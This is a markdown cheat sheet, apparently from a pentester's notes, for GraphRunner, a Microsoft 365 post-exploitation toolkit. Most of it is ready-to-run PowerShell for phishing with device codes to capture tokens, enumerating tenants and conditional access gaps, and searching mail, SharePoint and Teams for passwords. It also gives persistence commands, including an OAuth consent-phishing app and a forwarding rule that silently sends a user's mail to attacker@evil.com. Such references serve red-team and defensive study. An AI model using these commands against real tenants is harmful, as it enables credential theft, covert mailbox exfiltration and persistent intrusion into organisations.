# GraphRunner

**Tags:** `#graphrunner` `#microsoft365` `#graph` `#cloud` `#postexploitation` `#pillaging` `#teams` `#sharepoint` `#outlook`

Microsoft Graph API post-exploitation toolkit — focused on pillaging M365 data after gaining a valid access token. Targets Teams messages, SharePoint files, OneDrive, Outlook email, and OneNote for credential and sensitive data harvesting. Also includes token management, device code phishing, and conditional access policy enumeration.

**Source:** https://github.com/dafthack/GraphRunner
**Install:**
```powershell
git clone https://github.com/dafthack/GraphRunner
Import-Module .\GraphRunner.ps1
```

> [!note] **GraphRunner use case** — Once you have a valid M365 access token (via spray, phishing, device code, or token theft), GraphRunner automates the pillaging phase: searching Teams for passwords, pulling SharePoint files, reading emails, finding stored credentials. It's the post-auth M365 data harvesting tool.

> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] Post-Auth Graph Enumeration and Illicit Consent Grant sections.

> [!warning] **Verified against `GraphRunner.ps1` (2026-08).** Several function names in older guides are wrong — there is **no** `Invoke-DeviceCodeFlow`, `Invoke-SearchTeamsMessages`, `Get-ConditionalAccessPolicies`, `Get-AzureADApps`, or any **OneNote** function. The real names are below; every function takes `-Tokens $tokens`. Run `List-GraphRunnerModules` for the current inventory.

---

## The all-in-one — `Invoke-GraphRunner`

```powershell
# One command runs the whole pillage: Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups,
# Invoke-DumpCAPS, Invoke-DumpApps, then searches Mailbox/SharePoint+OneDrive/Teams using
# the default_detectors.json patterns (passwords, keys, cnxn strings, etc.)
Invoke-GraphRunner -Tokens $tokens
```

Start here, then use the individual functions below to dig into specific hits.

---

## Authentication & Token Management

```powershell
# Device-code auth by default — displays a user_code to phish (microsoft.com/devicelogin),
# then polls and captures the token set. Store it in $tokens for every later command.
$tokens = Get-GraphTokens
Get-GraphTokens -UserPasswordAuth      # ROPC (username/password) instead of device code

# Refresh into other audiences
Invoke-RefreshGraphTokens -RefreshToken <rt> -tenantid <tid>
Invoke-RefreshToSharePointToken -Tokens $tokens -Domain <company>

# Import a token set captured elsewhere / keep them fresh automatically
Invoke-ImportTokens -Tokens $tokens
Invoke-AutoTokenRefresh -Tokens $tokens
```

---

## Recon

```powershell
# Tenant, current-user privileges, licensing, tenant settings
Invoke-GraphRecon -Tokens $tokens

# All users
Get-AzureADUsers -Tokens $tokens

# Groups — including the ones useful for privesc
Get-SecurityGroups  -Tokens $tokens
Get-DynamicGroups   -Tokens $tokens     # membership rules you may be able to satisfy
Get-UpdatableGroups -Tokens $tokens     # groups you can add yourself to

# Conditional Access policies (find MFA/location gaps)
Invoke-DumpCAPS -Tokens $tokens -ResolveGuids

# App registrations + delegated/illicit consent grants (over-permissive apps)
Invoke-DumpApps -Tokens $tokens
```

---

## Pillaging (Mailbox / SharePoint+OneDrive / Teams)

```powershell
# Search each store for a keyword (repeat per term, or let Invoke-GraphRunner sweep them)
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 500
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password"   # covers OneDrive too
Invoke-SearchTeams -Tokens $tokens -SearchTerm "password"

# Creds hidden in AD user attributes (description/notes fields)
Invoke-SearchUserAttributes -Tokens $tokens -SearchTerm "password"

# Read a mailbox / list SharePoint sites / Teams data
Get-Inbox -Tokens $tokens
Get-SharePointSiteURLs -Tokens $tokens
Get-TeamsChannels -Tokens $tokens
Get-TeamsChat -Tokens $tokens
```

> [!tip] **Detectors, not one-off terms.** `Invoke-Search*` and `Invoke-GraphRunner` read `default_detectors.json` — edit that file to add your own regex/keywords rather than looping single `-SearchTerm` values by hand.

---

## Persistence & Backdoors

```powershell
# Illicit consent grant — inject an OAuth app and get a consent URL to phish
Invoke-InjectOAuthApp -Tokens $tokens

# Mailbox forwarding rule (silent exfil of a user's mail)
Invoke-CreateInboxForwardingRule -Tokens $tokens -RuleName "Sync" -EmailAddress attacker@evil.com

# Group / guest abuse for lateral persistence
Invoke-SecurityGroupCloner -Tokens $tokens
Invoke-InviteGuest -Tokens $tokens
```

---

> [!note] **Related tooling** — get tokens for `-Tokens` from [[Tools/Cloud/AADInternals|AADInternals]] (`Get-AADIntAccessTokenForMSGraph`); [[Tools/Cloud/BARK|BARK]] executes the Entra *abuse* edges once pillaging finds a path.

---

*Created: 2026-03-06*
*Updated: 2026-08-27*
*Model: claude-opus-5*
